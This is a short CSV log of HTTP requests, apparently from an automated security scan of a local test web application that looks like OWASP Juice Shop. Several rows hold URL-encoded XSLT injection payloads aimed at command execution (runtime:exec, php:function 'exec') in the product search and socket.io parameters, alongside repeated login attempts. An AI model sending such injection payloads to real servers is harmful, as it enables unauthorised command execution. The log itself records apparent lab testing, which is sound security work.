Id,Req. Timestamp,Resp. Timestamp,Método,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
80901,Tue Jun 02 01:35:58 WEST 2020,Tue Jun 02 01:35:58 WEST 2020,GET,http://10.0.2.2:3000/rest/products/search?q=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,500,Internal Server Error,411,286,2474
80904,Tue Jun 02 01:35:58 WEST 2020,Tue Jun 02 01:35:58 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,410,286,1982
80905,Tue Jun 02 01:35:58 WEST 2020,Tue Jun 02 01:35:58 WEST 2020,GET,http://10.0.2.2:3000/rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,500,Internal Server Error,412,286,1626
80908,Tue Jun 02 01:35:58 WEST 2020,Tue Jun 02 01:35:59 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,431,286,1398
80911,Tue Jun 02 01:35:59 WEST 2020,Tue Jun 02 01:35:59 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,313,332,26
80914,Tue Jun 02 01:35:59 WEST 2020,Tue Jun 02 01:35:59 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,283,332,26
80917,Tue Jun 02 01:35:59 WEST 2020,Tue Jun 02 01:36:00 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3C&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,235,153,34
80918,Tue Jun 02 01:35:59 WEST 2020,Tue Jun 02 01:36:00 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,312,332,26
80921,Tue Jun 02 01:36:00 WEST 2020,Tue Jun 02 01:36:00 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,295,153,34
80924,Tue Jun 02 01:36:00 WEST 2020,Tue Jun 02 01:36:00 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,240,153,34
